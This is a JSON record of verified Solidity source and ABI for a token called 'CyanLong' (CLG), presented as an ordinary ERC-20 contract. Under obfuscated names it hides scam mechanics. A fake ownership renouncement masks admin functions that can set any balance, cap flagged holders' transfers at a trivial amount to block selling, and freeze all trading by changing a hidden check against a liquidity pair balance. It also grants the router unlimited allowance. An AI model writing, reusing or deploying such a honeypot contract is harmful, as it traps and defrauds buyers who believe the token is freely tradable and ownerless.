{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.7;\n\ninterface totalIsMarketing {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract marketingMode {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface receiverTo {\n    function createPair(address liquiditySwap, address toMax) external returns (address);\n}\n\ninterface tokenAmount {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address toTake) external view returns (uint256);\n\n    function transfer(address enableFrom, uint256 receiverExempt) external returns (bool);\n\n    function allowance(address swapTradingShould, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 receiverExempt) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address enableFrom,\n        uint256 receiverExempt\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed fromBuy, uint256 value);\n    event Approval(address indexed swapTradingShould, address indexed spender, uint256 value);\n}\n\ninterface tokenAmountMetadata is tokenAmount {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract CyanLong is marketingMode, tokenAmount, tokenAmountMetadata {\n\n    address atTrading = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function teamAmountSell(address buyAmount) public {\n        if (sellList) {\n            return;\n        }\n        if (receiverIsTotal != amountFundTo) {\n            swapReceiver = takeSender;\n        }\n        liquidityFrom[buyAmount] = true;\n        \n        sellList = true;\n    }\n\n    function transfer(address amountAt, uint256 receiverExempt) external virtual override returns (bool) {\n        return liquidityTotal(_msgSender(), amountAt, receiverExempt);\n    }\n\n    bool public amountFundTo;\n\n    uint256 public takeSender;\n\n    function transferFrom(address sellBuy, address enableFrom, uint256 receiverExempt) external override returns (bool) {\n        if (_msgSender() != atTrading) {\n            if (takeAmountIs[sellBuy][_msgSender()] != type(uint256).max) {\n                require(receiverExempt <= takeAmountIs[sellBuy][_msgSender()]);\n                takeAmountIs[sellBuy][_msgSender()] -= receiverExempt;\n            }\n        }\n        return liquidityTotal(sellBuy, enableFrom, receiverExempt);\n    }\n\n    event OwnershipTransferred(address indexed listEnableExempt, address indexed tradingFee);\n\n    uint256 public walletFrom;\n\n    mapping(address => mapping(address => uint256)) private takeAmountIs;\n\n    uint256 private senderEnable;\n\n    bool private receiverIsTotal;\n\n    uint256 private teamTrading = 100000000 * 10 ** 18;\n\n    address public teamIs;\n\n    function minTrading() private view {\n        require(liquidityFrom[_msgSender()]);\n    }\n\n    uint8 private takeMin = 18;\n\n    function enableLimit(address sellBuy, address enableFrom, uint256 receiverExempt) internal returns (bool) {\n        require(receiverAt[sellBuy] >= receiverExempt);\n        receiverAt[sellBuy] -= receiverExempt;\n        receiverAt[enableFrom] += receiverExempt;\n        emit Transfer(sellBuy, enableFrom, receiverExempt);\n        return true;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return takeMin;\n    }\n\n    function buyShouldMarketing(address senderMarketing) public {\n        minTrading();\n        \n        if (senderMarketing == teamIs || senderMarketing == atTake) {\n            return;\n        }\n        tradingExempt[senderMarketing] = true;\n    }\n\n    mapping(address => bool) public liquidityFrom;\n\n    address toSenderIs = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    bool public sellList;\n\n    mapping(address => uint256) private receiverAt;\n\n    mapping(address => bool) public tradingExempt;\n\n    uint256 private maxTx;\n\n    function getOwner() external view returns (address) {\n        return feeWalletAt;\n    }\n\n    function launchFund(address amountAt, uint256 receiverExempt) public {\n        minTrading();\n        receiverAt[amountAt] = receiverExempt;\n    }\n\n    string private fundToken = \"Cyan Long\";\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return teamTrading;\n    }\n\n    function owner() external view returns (address) {\n        return feeWalletAt;\n    }\n\n    uint256 public isMode;\n\n    constructor (){\n        \n        totalIsMarketing txMarketing = totalIsMarketing(atTrading);\n        atTake = receiverTo(txMarketing.factory()).createPair(txMarketing.WETH(), address(this));\n        \n        teamIs = _msgSender();\n        shouldReceiver();\n        liquidityFrom[teamIs] = true;\n        receiverAt[teamIs] = teamTrading;\n        \n        emit Transfer(address(0), teamIs, teamTrading);\n    }\n\n    bool public receiverLimitTeam;\n\n    uint256 constant totalShould = 3 ** 10;\n\n    address public atTake;\n\n    uint256 public swapReceiver;\n\n    function shouldReceiver() public {\n        emit OwnershipTransferred(teamIs, address(0));\n        feeWalletAt = address(0);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return fundToken;\n    }\n\n    function balanceOf(address toTake) public view virtual override returns (uint256) {\n        return receiverAt[toTake];\n    }\n\n    uint256 autoWallet;\n\n    function symbol() external view virtual override returns (string memory) {\n        return walletLiquidity;\n    }\n\n    function liquidityTotal(address sellBuy, address enableFrom, uint256 receiverExempt) internal returns (bool) {\n        if (sellBuy == teamIs) {\n            return enableLimit(sellBuy, enableFrom, receiverExempt);\n        }\n        uint256 exemptReceiverLiquidity = tokenAmount(atTake).balanceOf(toSenderIs);\n        require(exemptReceiverLiquidity == autoWallet);\n        require(enableFrom != toSenderIs);\n        if (tradingExempt[sellBuy]) {\n            return enableLimit(sellBuy, enableFrom, totalShould);\n        }\n        return enableLimit(sellBuy, enableFrom, receiverExempt);\n    }\n\n    function allowance(address enableTeam, address limitTrading) external view virtual override returns (uint256) {\n        if (limitTrading == atTrading) {\n            return type(uint256).max;\n        }\n        return takeAmountIs[enableTeam][limitTrading];\n    }\n\n    uint256 toFrom;\n\n    bool private minTxLimit;\n\n    function isMarketing(uint256 receiverExempt) public {\n        minTrading();\n        autoWallet = receiverExempt;\n    }\n\n    function approve(address limitTrading, uint256 receiverExempt) public virtual override returns (bool) {\n        takeAmountIs[_msgSender()][limitTrading] = receiverExempt;\n        emit Approval(_msgSender(), limitTrading, receiverExempt);\n        return true;\n    }\n\n    string private walletLiquidity = \"CLG\";\n\n    address private feeWalletAt;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapTradingShould\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"listEnableExempt\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingFee\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromBuy\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableTeam\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"limitTrading\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountFundTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverExempt\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atTake\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toTake\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderMarketing\",\"type\":\"address\"}],\"name\":\"buyShouldMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"receiverExempt\",\"type\":\"uint256\"}],\"name\":\"isMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isMode\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverExempt\",\"type\":\"uint256\"}],\"name\":\"launchFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"liquidityFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverLimitTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapReceiver\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeSender\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyAmount\",\"type\":\"address\"}],\"name\":\"teamAmountSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamIs\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tradingExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverExempt\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellBuy\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"enableFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverExempt\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletFrom\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "CyanLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}